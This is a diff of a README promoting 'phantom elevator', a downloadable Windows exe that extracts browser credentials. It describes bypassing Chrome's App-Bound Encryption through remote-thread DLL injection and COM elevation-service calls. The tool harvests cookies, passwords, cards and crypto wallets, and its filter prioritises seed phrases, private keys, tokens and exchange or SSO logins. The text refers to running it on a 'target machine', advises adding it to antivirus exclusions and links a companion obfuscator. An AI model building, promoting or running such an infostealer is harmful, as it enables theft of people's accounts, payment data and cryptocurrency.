@@ -2,9 +2,9 @@
 
 # 👻 phantom elevator
 
-### Prebuilt Windows Binary · Build Pipeline · No Python on Target
+### Multi-Browser Credential Extraction · App-Bound Encryption Bypass
 
-*Download one file, run it, read the output. Or build it yourself in three commands.*
+*Prebuilt Windows exe. No Python, no compiler, no install.*
 
 <br>
 
@@ -16,17 +16,17 @@
 
 <br>
 
-<img src="https://img.shields.io/badge/📦_Output-~13_MB_exe-8a2be2?style=for-the-badge" alt="Output ~13 MB">
-<img src="https://img.shields.io/badge/⚙️_Builder-Nuitka_4.x-e11d48?style=for-the-badge" alt="Nuitka 4.x">
-<img src="https://img.shields.io/badge/🔓_ABE-Prebuilt_DLLs-22c55e?style=for-the-badge" alt="Prebuilt DLLs">
+<img src="https://img.shields.io/badge/🔓_ABE-Bypassed-e11d48?style=for-the-badge" alt="ABE Bypassed">
+<img src="https://img.shields.io/badge/🌐_Browsers-13_Families-8a2be2?style=for-the-badge" alt="13 Browser Families">
+<img src="https://img.shields.io/badge/📦_One_File-~13_MB-0ea5e9?style=for-the-badge" alt="One File ~13 MB">
 
 <br><br>
 
-**ONE FILE** &nbsp;·&nbsp; **NO INSTALL** &nbsp;·&nbsp; **NO DEPENDENCIES** &nbsp;·&nbsp; **13 BROWSER FAMILIES**
+**DPAPI + V20 BYPASS** &nbsp;·&nbsp; **COM ELEVATION BRIDGE** &nbsp;·&nbsp; **SIGNAL-FIRST RANKING**
 
 <br>
 
-[**⬇️ Download**](#download) · [**🔨 Build**](#build) · [**🖥️ CLI**](#cli) · [**🌐 Browsers**](#browsers) · [**❓ FAQ**](#faq)
+[**⬇️ Download**](#download) · [**🔨 Build**](#build) · [**🖥️ CLI**](#cli) · [**🌐 Browsers**](#browsers) · [**⚡ Bypass**](#bypass) · [**❓ FAQ**](#faq)
 
 </div>
 
@@ -35,19 +35,19 @@
 > [!TIP]
 > **Two ways to get this tool.**
 >
-> **Download** the prebuilt `phantom_elevator.exe` from [**Releases**](https://github.com/Hidden-Rhythm/abe_bypass/releases/latest) — nothing to install, nothing to build.
+> **Download** the prebuilt `phantom_elevator.exe` from [**Releases**](https://github.com/Hidden-Rhythm/abe_bypass/releases/latest) — one file, no install, no Python.
 >
-> **Or build it yourself** — three commands, produces the same exe from source you can read.
+> **Or build it yourself** — `build_dll.py` compiles the ABE DLLs, `build_exe.py` bundles everything into an exe via Nuitka. Three commands, same output.
 >
-> Want the Python-only edition? **[abe-bypass](https://github.com/Hidden-Rhythm/abe-bypass)** is one `.py` file, runs with `python phantom_elevator.py`.
+> **Python-only edition** lives at **[Hidden-Rhythm/abe-bypass](https://github.com/Hidden-Rhythm/abe-bypass)** — one `.py` file, runs with `python phantom_elevator.py`. Same tool, same CLI, same output.
 
 ---
 
-## 🎯 What Is This Repo?
+## 🎯 What Is Phantom Elevator?
 
-**Phantom Elevator** is a credential extractor built for the post-ABE era. It walks Chromium and Firefox profile directories, locates every encrypted secret store, and recovers the plaintext — including the **v20 App-Bound Encryption** keys that broke every legacy DPAPI-only extractor.
+**phantom elevator** is a Windows credential extractor built for the post-ABE era. It walks Chromium and Firefox profile directories, locates every encrypted secret store, and recovers the plaintext — including the **v20 App-Bound Encryption** keys that broke every legacy DPAPI-only extractor.
 
-This repo holds both the **download** and the **build pipeline**:
+This repo ships both a **prebuilt exe** and the **build pipeline** that produces it:
 
 | Path | What you get |
 |---|---|
@@ -56,7 +56,7 @@ This repo holds both the **download** and the **build pipeline**:
 
 The exe bundles Python 3.12, `pycryptodome`, `python-snappy`, and **5 prebuilt ABE DLLs**. Nothing to install. Nothing beside it.
 
-> 🎯 **The goal:** download, double-click, read the output.
+> 🎯 **The goal:** download, double-click, read the output. Or build it yourself in three commands.
 
 <br>
 
@@ -65,13 +65,13 @@ The exe bundles Python 3.12, `pycryptodome`, `python-snappy`, and **5 prebuilt A
 <td width="33%" valign="top">
 
 **🎯 Detect**
-Finds Chromium and Firefox families from standard install paths. Missing browsers skipped, not fatal.
+Enumerates Chromium and Firefox families from standard install paths. Missing browsers are skipped, not fatal.
 
 </td>
 <td width="33%" valign="top">
 
 **🔓 Recover**
-Resolves each browser's key store — `v10` via DPAPI, `v20` via the embedded ABE DLL.
+Resolves each browser's key store — `v10` via DPAPI, `v20` via a prebuilt elevation bridge DLL.
 
 </td>
 <td width="33%" valign="top">
@@ -121,6 +121,190 @@ Scores every local-storage entry before writing. Wallets, tokens, and seed phras
 
 ---
 
+<a id="chain"></a>
+## 🔗 The Chain That Broke
+
+For years, credential tooling relied on one chain:
+
+```text
+Local State  →  encrypted_key (v10)  →  CryptUnprotectData  →  AES-256-GCM  →  plaintext
+```
+
+That chain still works — for `v10`.
+
+Chrome 127 introduced **App-Bound Encryption** 🔒. The master key is now sealed inside a COM elevation service that only the browser's own signed process is supposed to reach. DPAPI returns ciphertext. The old chain dead-ends.
+
+---
+
+<a id="bypass"></a>
+## ⚡ The ABE Problem
+
+Phantom Elevator adds the missing bridge.
+
+```text
+Local State  →  encrypted_key (v20)  →  elevation-service bridge  →  master key  →  AES-256-GCM  →  plaintext
+```
+
+<br>
+
+<details open>
+<summary><b>⚙️ The bypass, step by step</b></summary>
+
+<br>
+
+```text
+phantom_elevator.py
+        │
+        ├─ 01. Parse Local State → os_crypt.app_bound_encrypted_key
+        │
+        ├─ 02. Verify the APPB prefix, strip it, keep the sealed blob
+        │
+        ├─ 03. Resolve the ABE DLL for this browser
+        │        prebuilt — dlls/<name>.dll, embedded in the exe
+        │
+        ├─ 04. Ensure the browser's elevation service is RUNNING
+        │
+        ├─ 05. Launch browser --version in a sandboxed TEMP
+        │        OpenProcess → VirtualAllocEx → WriteProcessMemory
+        │        → CreateRemoteThread(LoadLibraryW)
+        │
+        ├─ 06. DLL: CoCreateInstance(ElevationService, CLSCTX_LOCAL_SERVER)
+        │        → vtable decrypt slot → ph_out.bin
+        │
+        └─ 07. Python reads the 32-byte key → AES-256-GCM decrypts
+                 🍪 cookies · 🔑 passwords · 💳 cards
+```
+
+</details>
+
+<br>
+
+Each supported Chromium build ships its own `cls_id`, `iid_v1` / `iid_v2`, elevation service name, and `vtable_offset` — all carried in the `BROWSERS` table. The exe ships five prebuilt DLLs, one per ABE browser, so the target machine never needs a compiler. If a DLL is missing for a browser, `_resolve_abe_dll` falls back to compiling at runtime with `gcc` — a path that only works on a dev box.
+
+---
+
+<a id="browsers"></a>
+## 🌐 Supported Browsers
+
+### 🔵 Chromium family
+
+| | Browser | Key protection | ABE bridge |
+|:---:|:---|:---|:---:|
+| <img src="https://www.google.com/s2/favicons?domain=google.com&sz=64" height="18"> | **Google Chrome** | DPAPI + ABE | ✅ |
+| <img src="https://www.google.com/s2/favicons?domain=google.com&sz=64" height="18"> | Chrome Beta | DPAPI + ABE | ✅ |
+| <img src="https://www.google.com/s2/favicons?domain=brave.com&sz=64" height="18"> | **Brave** | DPAPI + ABE | ✅ |
+| <img src="https://www.google.com/s2/favicons?domain=microsoft.com&sz=64" height="18"> | Microsoft Edge | DPAPI + ABE | ✅ |
+| <img src="https://www.google.com/s2/favicons?domain=avast.com&sz=64" height="18"> | Avast Secure Browser | DPAPI + ABE | ✅ |
+| <img src="https://www.google.com/s2/favicons?domain=vivaldi.com&sz=64" height="18"> | Vivaldi | DPAPI | ➖ |
+| <img src="https://www.google.com/s2/favicons?domain=chromium.org&sz=64" height="18"> | Chromium | DPAPI | ➖ |
+| <img src="https://www.google.com/s2/favicons?domain=opera.com&sz=64" height="18"> | Opera | DPAPI | ➖ |
+| <img src="https://www.google.com/s2/favicons?domain=opera.com&sz=64" height="18"> | Opera GX | DPAPI | ➖ |
+
+### 🦊 Firefox family
+
+| | Browser | Key protection | Status |
+|:---:|:---|:---|:---:|
+| <img src="https://www.google.com/s2/favicons?domain=mozilla.org&sz=64" height="18"> | **Firefox** | NSS / `key4.db` | ✅ |
+| <img src="https://www.google.com/s2/favicons?domain=waterfox.net&sz=64" height="18"> | Waterfox | NSS / `key4.db` | ✅ |
+| <img src="https://www.google.com/s2/favicons?domain=librewolf.net&sz=64" height="18"> | LibreWolf | NSS / `key4.db` | ✅ |
+| <img src="https://www.google.com/s2/favicons?domain=floorp.app&sz=64" height="18"> | Floorp | NSS / `key4.db` | ✅ |
+| <img src="https://www.google.com/s2/favicons?domain=zen-browser.app&sz=64" height="18"> | Zen Browser | NSS / `key4.db` | ✅ |
+
+<sub>💡 Detected from `%LocalAppData%`, `%AppData%`, `%ProgramFiles%`. Missing browsers skipped, not fatal.</sub>
+
+---
+
+## 📦 Extraction Matrix
+
+<table>
+<tr>
+<th></th>
+<th align="left">Category</th>
+<th align="left">Flag</th>
+<th align="left">Chromium source</th>
+<th align="left">Firefox source</th>
+</tr>
+<tr><td>🍪</td><td><b>Cookies</b></td><td><code>--cookies</code></td><td><code>Network/Cookies</code></td><td><code>cookies.sqlite</code></td></tr>
+<tr><td>🔑</td><td><b>Passwords</b></td><td><code>--passwords</code></td><td><code>Login Data</code></td><td><code>logins.json</code></td></tr>
+<tr><td>📜</td><td>History</td><td><code>--history</code></td><td><code>History</code></td><td><code>places.sqlite</code></td></tr>
+<tr><td>📝</td><td>Autofill</td><td><code>--autofill</code></td><td><code>Web Data</code></td><td>—</td></tr>
+<tr><td>💳</td><td><b>Cards &amp; IBANs</b></td><td><code>--cards</code></td><td><code>Web Data</code></td><td>—</td></tr>
+<tr><td>🗂️</td><td>Local Storage</td><td><code>--local-storage</code></td><td><code>Local Storage/leveldb</code></td><td>—</td></tr>
+<tr><td>🔖</td><td>Bookmarks</td><td><code>--bookmarks</code></td><td><code>Bookmarks</code></td><td><code>places.sqlite</code></td></tr>
+<tr><td>🧩</td><td>Extensions</td><td><code>--extensions</code></td><td><code>Extensions/</code></td><td>—</td></tr>
+<tr><td>🪙</td><td><b>Wallets</b></td><td><code>--wallets</code></td><td>extension storage</td><td>—</td></tr>
+<tr><td>👤</td><td>Account</td><td><i>always</i></td><td><code>Preferences</code> / <code>Local State</code></td><td><code>signedInUser.json</code></td></tr>
+</table>
+
+<sub>💡 No category flag selected = every category. Account metadata is always written when signed-in data is present.</sub>
+
+---
+
+<a id="signal"></a>
+## 📡 Signal-First Filtering
+
+> A raw dump is noise. `--important` keeps only the entries that matter — crypto, finance, identity, and developer hosts.
+
+**🏦 High-value hosts** — from `_IMP_HOSTS`:
+
+```text
+MetaMask · Phantom · Coinbase · Binance · Kraken · OKX · KuCoin · Bybit
+Uniswap · Aave · OpenSea · WalletConnect · Ledger · Trezor · Trust Wallet
+accounts.google.com · login.microsoftonline.com · github.com · gitlab.com
+Auth0 · Okta · Discord · Slack
+```
+
+**🔑 High-value keys** — matched by `_IMP_KEY_PAT`:
+
+`token` `jwt` `session` `auth` `api_key` `secret` `passw` `private_key` `privatekey` `seed` `mnemonic` `wallet` `keystore` `signer` `phrase`
+
+**💎 High-value values** — matched by `_IMP_VAL_PAT`:
+
+seed phrases · `0x` private keys (40–64 hex) · Bech32 `bc1…` · base58 Bitcoin addresses
+
+`--important` applies to cookies, passwords, history, and local storage. Anything filtered out lands in the `--debug-drops` breakdown as `skipped_not_important`.
+
+---
+
+## 🏗️ Architecture
+
+```text
+┌─────────────────────────────────────────────────────────────┐
+│                     PHANTOM ELEVATOR                        │
+│               single-file Python app · exe build            │
+├─────────────────────────────────────────────────────────────┤
+│                                                             │
+│   Browser discovery                                         │
+│        │                                                    │
+│        ├── Chromium profiles ──┐                            │
+│        └── Firefox profiles ───┤                            │
+│                                ▼                            │
+│                     Profile walker                          │
+│                                │                            │
+│              ┌─────────────────┼─────────────────┐          │
+│              ▼                 ▼                 ▼          │
+│          SQLite reader     LevelDB reader    NSS reader     │
+│              │                 │                 │          │
+│              └─────────────────┼─────────────────┘          │
+│                                ▼                            │
+│                     Key recovery layer                      │
+│              ┌─────────────────┴─────────────────┐          │
+│              ▼                                   ▼          │
+│        DPAPI (v10)                        ABE bridge (v20)  │
+│        CryptUnprotectData                 COM + DLL inject  │
+│                                           prebuilt in dlls/ │
+│              └─────────────────┬─────────────────┘          │
+│                                ▼                            │
+│                     AES-256-GCM decrypt                     │
+│                                │                            │
+│                                ▼                            │
+│               .txt · .csv · .json output                    │
+│                                                             │
+└─────────────────────────────────────────────────────────────┘
+```
+
+---
+
 <a id="download"></a>
 ## ⬇️ Download & Run
 
@@ -139,7 +323,7 @@ Grab `phantom_elevator.exe` from the [**latest release**](https://github.com/Hid
 Get-FileHash .\phantom_elevator.exe -Algorithm SHA256
 ```
 
-Compare to the value in the release notes. If they match, you have the build the author produced.
+Compare to the value in the release notes.
 
 ### 3️⃣ Run
 
@@ -214,7 +398,7 @@ python build_exe.py     # needs nothing — produces dist/phantom_elevator.exe
 | Edge | `edge.dll` |
 | Avast | `avast.dll` |
 
-Requires `x86_64-w64-mingw32-gcc` on `PATH`. Each DLL bakes in that browser's `cls_id`, `iid_v1`, `iid_v2`, and `vtable_offset`. Five files, ~15 KB each.
+Requires `x86_64-w64-mingw32-gcc` on `PATH`. Five files, ~15 KB each.
 
 **`build_exe.py`** — installs Nuitka if missing, validates the DLLs, runs a onefile build with everything embedded as data files.
 
@@ -228,15 +412,11 @@ Requires `x86_64-w64-mingw32-gcc` on `PATH`. Each DLL bakes in that browser's `c
   >
   [3/5] validating dlls...
         ok: 5 dlls present
-          chrome.dll  15360 bytes
-          ...
   [4/5] building (first run can take 3-5 minutes)...
   [5/5] done
         exe:  C:\...\dist\phantom_elevator.exe
         size: 12.8 MB
 ```
-
-Path prompts accept Enter for the default. Stray `[` `]` and quotes are stripped.
 
 ### Build times
 
@@ -269,12 +449,6 @@ Included data file 'dlls\chrome_beta.dll' due to specified data file
 ...
 ```
 
-Or check the built exe:
-
-```cmd
-"C:\Program Files\7-Zip\7z.exe" l dist\phantom_elevator.exe | findstr dlls
-```
-
 ---
 
 ## 🩺 Troubleshooting
@@ -284,9 +458,7 @@ Or check the built exe:
 
 <br>
 
-Nuitka 4.x dropped space-separated path options. `--output-dir C:\path` is parsed as `--output-dir` with no value plus a positional module name.
-
-**Fix:** `--output-dir=C:\path` — the `=` must be in the same token. Already handled in the shipped `build_exe.py`.
+Nuitka 4.x dropped space-separated path options. **Fix:** `--output-dir=C:\path`. Already handled in the shipped `build_exe.py`.
 
 </details>
 
@@ -295,9 +467,7 @@ Nuitka 4.x dropped space-separated path options. `--output-dir C:\path` is parse
 
 <br>
 
-Nuitka 4.x's `--include-data-dir` scan misses `*.dll` on Windows backslash paths. It warns, bundles nothing, and the build **succeeds** — producing a broken exe.
-
-Symptom at runtime: ABE extraction fails, drops table shows `compile_failed` for every browser, because `_resolve_abe_dll` finds no prebuilt DLL and falls back to compiling — and the target has no gcc.
+Nuitka 4.x's `--include-data-dir` scan misses `*.dll` on Windows backslash paths. It warns, bundles nothing, and the build **succeeds** — producing a broken exe. At runtime: ABE fails, drops table shows `compile_failed`.
 
 **Fix:** `--include-data-files=C:\path\dlls\*.dll=dlls/` — glob, not directory. Already handled in the shipped `build_exe.py`.
 
@@ -308,9 +478,7 @@ Symptom at runtime: ABE extraction fails, drops table shows `compile_failed` for
 
 <br>
 
-Older versions ran `nuitka --version`. That command probes for a C compiler, and on Windows the probe can block on the inherited stdout pipe for 40+ seconds before timing out.
-
-**Fix:** `importlib.metadata.version("nuitka")` reads the pip METADATA file off disk in ~2 ms. Already handled.
+Older versions ran `nuitka --version`, which probes for a C compiler and can block on the inherited stdout pipe for 40+ seconds. **Fix:** `importlib.metadata.version("nuitka")` — reads the pip METADATA file off disk. Already handled.
 
 </details>
 
@@ -319,7 +487,7 @@ Older versions ran `nuitka --version`. That command probes for a C compiler, and
 
 <br>
 
-Harmless. Nuitka falls back to the MinGW64 toolchain it downloads automatically. The build completes with gcc. No action needed.
+Harmless. Nuitka falls back to the MinGW64 toolchain it downloads automatically.
 
 </details>
 
@@ -328,9 +496,7 @@ Harmless. Nuitka falls back to the MinGW64 toolchain it downloads automatically.
 
 <br>
 
-The exe depends on the Universal C Runtime. Windows 10 and 11 ship it. Windows 8.1 needs KB2999226. Windows 7 unsupported.
-
-Since the ABE bypass needs Chrome or Edge, both of which dropped Win7 long ago, your real floor is Windows 10.
+Windows 10 and 11 ship UCRT. Windows 8.1 needs KB2999226. Windows 7 unsupported.
 
 </details>
 
@@ -339,9 +505,7 @@ Since the ABE bypass needs Chrome or Edge, both of which dropped Win7 long ago, 
 
 <br>
 
-Expected. A compiled binary that injects a DLL into Chrome and reads credential stores matches trojan heuristics by shape. Static analysis can't tell "authorized pentest tool" from "infostealer."
-
-You built it yourself from source you can read — that's your verification. For distribution, ship the SHA-256 alongside. See the [Download](#download) section.
+Expected. A compiled binary that injects a DLL into Chrome and reads credential stores matches trojan heuristics by shape. Verify the SHA-256 against the release, then add the folder to your exclusion list.
 
 </details>
 
@@ -350,21 +514,13 @@ You built it yourself from source you can read — that's your verification. For
 
 <br>
 
-`build_dll.py` couldn't find a 64-bit gcc.
-
 ```bash
 winget install BrechtSanders.WinLibs.POSIX.UCRT
 # or: choco install mingw
 # or: scoop install gcc
 ```
 
-Verify before rebuilding:
-
-```bash
-gcc -dumpmachine
-# want: x86_64-w64-mingw32
-# bad:  i686-w64-mingw32  (32-bit — won't work)
-```
+Verify: `gcc -dumpmachine` → want `x86_64-w64-mingw32`.
 
 </details>
 
@@ -380,7 +536,7 @@ gcc -dumpmachine
 | Drop reason | Meaning |
 |---|---|
 | `compile_failed` | No DLL found in `_MEIPASS\dlls\` — the glob didn't bundle |
-| `inject_failed` | DLL present, injection failed — check the error text |
+| `inject_failed` | DLL present, injection failed — check error text |
 | `service_unavailable` | Elevation service isn't running and won't start |
 | `bad_key_length` | DLL ran but returned wrong size — usually 32-bit DLL in 64-bit process |
 
@@ -478,87 +634,31 @@ phantom_elevator.exe --audit-only                 # read-only health check
 
 ---
 
-<a id="browsers"></a>
-## 🌐 Supported Browsers
+## 🔬 Technical Details
 
-### 🔵 Chromium
+| Component | Implementation |
+|---|---|
+| 📦 Builder | Nuitka 4.x → C → machine code |
+| 🐍 Python | 3.12 (embedded, compiled) |
+| 🪟 Platform | Windows 10 / 11, x64 |
+| 🔧 ABE bridge | C, prebuilt per-browser in `dlls/`, embedded in exe |
+| 🔓 Key unprotection | DPAPI `CryptUnprotectData` + AES-256-GCM |
+| ⚡ ABE access | COM elevation service + DLL injection |
+| 🎯 Injection | `OpenProcess` · `VirtualAllocEx` · `WriteProcessMemory` · `CreateRemoteThread` |
+| 🗄️ LevelDB | Built-in reader, `python-snappy` when available |
+| 🔐 Crypto | `pycryptodome` |
+| 🦊 Firefox passwords | NSS in-process via `ctypes` — no subprocess |
+| 🪙 Wallets | MetaMask, Phantom, Coinbase, Rabby, Trust + 14 generic |
 
-| | Browser | Key protection | ABE |
-|:---:|:---|:---|:---:|
-| <img src="https://www.google.com/s2/favicons?domain=google.com&sz=64" height="18"> | **Google Chrome** | DPAPI + ABE | ✅ |
-| <img src="https://www.google.com/s2/favicons?domain=google.com&sz=64" height="18"> | Chrome Beta | DPAPI + ABE | ✅ |
-| <img src="https://www.google.com/s2/favicons?domain=brave.com&sz=64" height="18"> | **Brave** | DPAPI + ABE | ✅ |
-| <img src="https://www.google.com/s2/favicons?domain=microsoft.com&sz=64" height="18"> | Microsoft Edge | DPAPI + ABE | ✅ |
-| <img src="https://www.google.com/s2/favicons?domain=avast.com&sz=64" height="18"> | Avast Secure Browser | DPAPI + ABE | ✅ |
-| <img src="https://www.google.com/s2/favicons?domain=vivaldi.com&sz=64" height="18"> | Vivaldi | DPAPI | ➖ |
-| <img src="https://www.google.com/s2/favicons?domain=chromium.org&sz=64" height="18"> | Chromium | DPAPI | ➖ |
-| <img src="https://www.google.com/s2/favicons?domain=opera.com&sz=64" height="18"> | Opera | DPAPI | ➖ |
-| <img src="https://www.google.com/s2/favicons?domain=opera.com&sz=64" height="18"> | Opera GX | DPAPI | ➖ |
+<a id="limitations"></a>
+### ⚠️ Compatibility & Limitations
 
-### 🦊 Firefox
-
-| | Browser | Key protection | Status |
-|:---:|:---|:---|:---:|
-| <img src="https://www.google.com/s2/favicons?domain=mozilla.org&sz=64" height="18"> | **Firefox** | NSS / `key4.db` | ✅ |
-| <img src="https://www.google.com/s2/favicons?domain=waterfox.net&sz=64" height="18"> | Waterfox | NSS / `key4.db` | ✅ |
-| <img src="https://www.google.com/s2/favicons?domain=librewolf.net&sz=64" height="18"> | LibreWolf | NSS / `key4.db` | ✅ |
-| <img src="https://www.google.com/s2/favicons?domain=floorp.app&sz=64" height="18"> | Floorp | NSS / `key4.db` | ✅ |
-| <img src="https://www.google.com/s2/favicons?domain=zen-browser.app&sz=64" height="18"> | Zen Browser | NSS / `key4.db` | ✅ |
-
----
-
-## 📦 Extraction Matrix
-
-<table>
-<tr>
-<th></th>
-<th align="left">Category</th>
-<th align="left">Flag</th>
-<th align="left">Chromium</th>
-<th align="left">Firefox</th>
-</tr>
-<tr><td>🍪</td><td><b>Cookies</b></td><td><code>--cookies</code></td><td><code>Network/Cookies</code></td><td><code>cookies.sqlite</code></td></tr>
-<tr><td>🔑</td><td><b>Passwords</b></td><td><code>--passwords</code></td><td><code>Login Data</code></td><td><code>logins.json</code></td></tr>
-<tr><td>📜</td><td>History</td><td><code>--history</code></td><td><code>History</code></td><td><code>places.sqlite</code></td></tr>
-<tr><td>📝</td><td>Autofill</td><td><code>--autofill</code></td><td><code>Web Data</code></td><td>—</td></tr>
-<tr><td>💳</td><td><b>Cards &amp; IBANs</b></td><td><code>--cards</code></td><td><code>Web Data</code></td><td>—</td></tr>
-<tr><td>🗂️</td><td>Local Storage</td><td><code>--local-storage</code></td><td><code>Local Storage/leveldb</code></td><td>—</td></tr>
-<tr><td>🔖</td><td>Bookmarks</td><td><code>--bookmarks</code></td><td><code>Bookmarks</code></td><td><code>places.sqlite</code></td></tr>
-<tr><td>🧩</td><td>Extensions</td><td><code>--extensions</code></td><td><code>Extensions/</code></td><td>—</td></tr>
-<tr><td>🪙</td><td><b>Wallets</b></td><td><code>--wallets</code></td><td>extension storage</td><td>—</td></tr>
-<tr><td>👤</td><td>Account</td><td><i>always</i></td><td><code>Preferences</code> / <code>Local State</code></td><td><code>signedInUser.json</code></td></tr>
-</table>
-
----
-
-## 🏗️ How the Pieces Fit
-
-```text
-build_dll.py
-    │  reads BROWSERS table from phantom_elevator.py
-    │  patches CLSID / IID / vtable into ABE_TEMPLATE
-    │  gcc -shared -static → dlls/<browser>.dll  ×5
-    ▼
-dlls/chrome.dll  dlls/chrome_beta.dll  dlls/brave.dll  dlls/edge.dll  dlls/avast.dll
-    │
-    ▼
-build_exe.py
-    │  nuitka --onefile
-    │  --include-data-files=dlls\*.dll=dlls/
-    ▼
-dist/phantom_elevator.exe    (~13 MB)
-    │
-    ▼
-target machine (no Python, no gcc)
-    │  extracts to %TEMP%\onefile_<rand>\
-    │  _resolve_abe_dll → _MEIPASS\dlls\<browser>.dll
-    │  OpenProcess → VirtualAllocEx → WriteProcessMemory
-    │  → CreateRemoteThread(LoadLibraryW)
-    │  DLL: CoCreateInstance(ElevationService) → vtable decrypt → 32-byte key
-    │  AES-256-GCM → plaintext
-    ▼
-out/Chrome/Default/{cookies,passwords,...}
-```
+- 🪟 **Windows 10 / 11 x64 only.** Win32 COM, DPAPI, cross-process injection. Windows 8.1 needs KB2999226; Windows 7 unsupported.
+- 🔄 **ABE is per-build.** A new browser elevation service invalidates the matching DLL. Fix: edit `BROWSERS`, re-run `build_dll.py`, re-run `build_exe.py`, ship a new exe.
+- 🔨 **gcc required on the build box.** Not on the target — that's the whole point.
+- 💾 **~13 MB exe, ~50 MB unpacked in `%TEMP%` while running.** Wiped on exit.
+- 🛡️ **AV will react.** Injection + credential access is a high-signal pattern.
+- 🦊 **Firefox passwords need `nss3.dll`.** Ships with every Firefox-family install.
 
 ---
 
@@ -566,6 +666,7 @@ out/Chrome/Default/{cookies,passwords,...}
 
 ```text
 abe_bypass/
+├── README.md
 ├── phantom_elevator.py    the tool (ABE resolves from dlls/, falls back to runtime compile)
 ├── build_dll.py           dev only — needs gcc — writes dlls/*.dll
 ├── build_exe.py           dev only — needs nuitka (auto-installs) — writes dist/*.exe
@@ -581,30 +682,17 @@ abe_bypass/
 
 ---
 
-## 🔬 Technical Details
+## 🛠️ Built With
 
-| Component | Implementation |
+| Technology | Purpose |
 |---|---|
-| 📦 Builder | Nuitka 4.x → C → machine code |
-| 🐍 Python | 3.12 (embedded, compiled) |
-| 🪟 Platform | Windows 10 / 11, x64 |
-| 🔧 ABE bridge | C, prebuilt per-browser in `dlls/` |
-| 🔓 Key unprotection | DPAPI `CryptUnprotectData` + AES-256-GCM |
-| ⚡ ABE access | COM elevation service + DLL injection |
-| 🎯 Injection | `OpenProcess` · `VirtualAllocEx` · `WriteProcessMemory` · `CreateRemoteThread` |
-| 🗄️ LevelDB | Built-in reader, `python-snappy` when available |
-| 🔐 Crypto | `pycryptodome` |
-| 🦊 Firefox passwords | NSS in-process via `ctypes` — no subprocess |
-| 🪙 Wallets | MetaMask, Phantom, Coinbase, Rabby, Trust + 14 generic |
-
-### ⚠️ Limitations
-
-- 🪟 **Windows 10 / 11 x64 only.** Win32 COM, DPAPI, cross-process injection. Windows 8.1 needs KB2999226; Windows 7 unsupported.
-- 🔄 **ABE is per-build.** A new browser elevation service invalidates the matching DLL. Fix: edit `BROWSERS`, re-run `build_dll.py`, re-run `build_exe.py`, ship a new exe.
-- 🔨 **gcc required on the build box.** Not on the target — that's the whole point.
-- 💾 **~13 MB exe, ~50 MB unpacked in `%TEMP%` while running.** Wiped on exit.
-- 🛡️ **AV will react.** Injection + credential access is a high-signal pattern.
-- 🦊 **Firefox passwords need `nss3.dll`.** Ships with every Firefox-family install.
+| 🐍 Python | Core application and extraction pipeline |
+| 🔐 DPAPI | `v10` key unprotection |
+| ⚡ COM | Elevation-service access for `v20` |
+| 📦 `pycryptodome` | AES-256-GCM decryption |
+| 🗜️ `python-snappy` | LevelDB block decompression |
+| ⚙️ Nuitka | Compiles Python → C → machine code |
+| 🔨 MinGW64 | Build-time C compiler (dev box only) |
 
 ---
 
@@ -616,9 +704,18 @@ abe_bypass/
 
 <br>
 
-Different audiences. [abe-bypass](https://github.com/Hidden-Rhythm/abe-bypass) is one file you run — good for reading the code or making a quick edit. This repo has the build pipeline — good for producing a binary you can hand to someone whose machine has no Python.
+Different audiences. **[abe-bypass](https://github.com/Hidden-Rhythm/abe-bypass)** is one file you run — good for reading the code or making a quick edit. This repo has the build pipeline and the prebuilt exe — good for producing a binary you can hand to someone whose machine has no Python.
 
 Keeping them separate also keeps `abe-bypass` honest as a "single-file Python application."
+
+</details>
+
+<details>
+<summary><b>Are there prebuilt releases?</b></summary>
+
+<br>
+
+Yes — see the [Releases page](https://github.com/Hidden-Rhythm/abe_bypass/releases/latest). Grab `phantom_elevator.exe` and run it. If you'd rather build, the pipeline is in this repo.
 
 </details>
 
@@ -628,8 +725,6 @@ Keeping them separate also keeps `abe-bypass` honest as a "single-file Python ap
 <br>
 
 Yes, but the exe will be weaker. Without `dlls/`, the bundled source falls back to compiling at runtime — and the target has no gcc, so the ABE path disables itself. You'd still get `v10` cookies/passwords and all Firefox extraction, but no `v20` ABE bypass.
-
-`build_exe.py` checks for all five DLLs at step `[3/5]` and refuses to build if any are missing.
 
 </details>
 
@@ -658,8 +753,6 @@ No. `build_dll.py` produces PE DLLs with `-lole32 -loleaut32 -luser32` — Windo
 
 Nuitka still relinks. `phantom_elevator.py` is one module, so editing it forces that module to recompile and the whole thing to relink. The other 220 C files hit ccache.
 
-Use `--standalone` instead of `--onefile` if build speed matters more than a single file — it skips the compression and bootstrap stages.
-
 </details>
 
 ---
@@ -680,6 +773,10 @@ Use `--standalone` instead of `--onefile` if build speed matters more than a sin
   <img src="https://img.shields.io/badge/Companion-obfuscator-52525b?style=for-the-badge&logo=github&logoColor=white" alt="Obfuscator">
 </a>
 
+<a href="https://github.com/Hidden-Rhythm">
+  <img src="https://img.shields.io/badge/Developer-Hidden--Rhythm-52525b?style=for-the-badge&logo=github&logoColor=white" alt="Developer Profile">
+</a>
+
 <a href="https://discord.com/users/hidden_rhythm">
   <img src="https://img.shields.io/badge/Discord-hidden__rhythm-5865F2?style=for-the-badge&logo=discord&logoColor=white" alt="Discord">
 </a>
@@ -694,6 +791,6 @@ Use `--standalone` instead of `--onefile` if build speed matters more than a sin
 
 **Hidden-Rhythm**
 
-<sub>phantom elevator · v1.0.0 · ABE bypass · 13 browser families · build pipeline</sub>
+<sub>phantom elevator · v1.0.0 · ABE bypass · 13 browser families · exe edition</sub>
 
 </div>
